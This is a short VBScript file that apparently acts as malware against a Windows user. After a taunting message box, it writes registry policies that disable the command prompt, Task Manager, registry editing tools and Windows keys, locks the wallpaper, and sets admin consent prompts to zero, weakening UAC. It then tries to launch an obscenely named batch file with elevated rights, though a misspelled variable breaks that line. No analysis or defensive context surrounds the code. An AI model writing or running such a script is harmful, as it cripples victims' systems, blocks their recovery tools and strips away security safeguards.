set x = createobject("Wscript.shell")
set c = createobject("Scripting.FilesystemObject")
set objShell = createobject("Shell.Application")
on error resume next

'####################################################################

msgBox "Now we'll finish that :)", , "e32"
x.RegWrite"HKCU\SOFTWARE\Policies\Microsoft\Windows\System\DisableCMD","2","REG_DWORD"
x.RegWrite"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr","1","REG_DWORD"
x.RegWrite"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistrytools","1","REG_DWORD"
x.RegWrite"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoWinKeys","1","REG_DWORD"
x.RegWrite"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin","0","REG_DWORD"
x.RegWrite"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ActiveDesktop\NoChangingWallpaper","1","REG_DWORD"

dim executeFinally
 executeFinally="C:\fuckyou\ass\mstechfucker.bat" 
 ObjShell.ShellExecute "wscript.exe", """" & executeFinnaly & """ RunAsAdministrator", , "runas", 1 
